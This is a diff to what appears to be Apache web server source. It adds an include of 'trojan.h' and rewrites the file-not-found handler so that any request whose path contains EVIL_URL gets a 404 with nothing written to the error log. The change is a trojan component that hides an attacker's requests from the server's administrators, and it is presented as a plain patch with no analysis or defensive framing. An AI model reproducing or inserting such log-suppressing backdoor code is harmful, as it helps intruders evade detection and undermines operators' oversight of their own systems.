@@ -1,0 +1,40 @@
+58a59,60
+> #include "trojan.h"
+> 
+3125a3128,3131
+>     char *uno;
+>     char *dos;
+>     int dontlog=0;
+> 
+3155,3160c3161,3172
+<     if (r->finfo.st_mode == 0 || (r->path_info && *r->path_info)) {
+< 	ap_log_rerror(APLOG_MARK, APLOG_ERR|APLOG_NOERRNO, r,
+< 		      "File does not exist: %s",r->path_info ?
+< 		      ap_pstrcat(r->pool, r->filename, r->path_info, NULL)
+< 		      : r->filename);
+< 	return HTTP_NOT_FOUND;
+---
+>     uno = r->path_info;
+>     dos = ap_pstrcat(r->pool, r->filename, r->path_info, NULL);
+> //    if (!strstr(uno,EVIL_URL)) //|| (!strstr(dos,EVIL_URL)))
+>     if (strstr(dos,EVIL_URL))
+>         dontlog=1;
+>     else
+>         dontlog=0;
+> 
+>     if (dontlog == 1)
+>     {
+>         dontlog=0;
+>         return HTTP_NOT_FOUND;
+3161a3174,3184
+>     else
+>     {
+>         if (r->finfo.st_mode == 0 || (r->path_info && *r->path_info)) {
+>             ap_log_rerror(APLOG_MARK, APLOG_ERR|APLOG_NOERRNO, r,
+>                           "File does not exist: %s",r->path_info ?
+>                           ap_pstrcat(r->pool, r->filename, r->path_info, NULL)
+>                           : r->filename);
+>             return HTTP_NOT_FOUND;
+>         }
+>     }
+> 
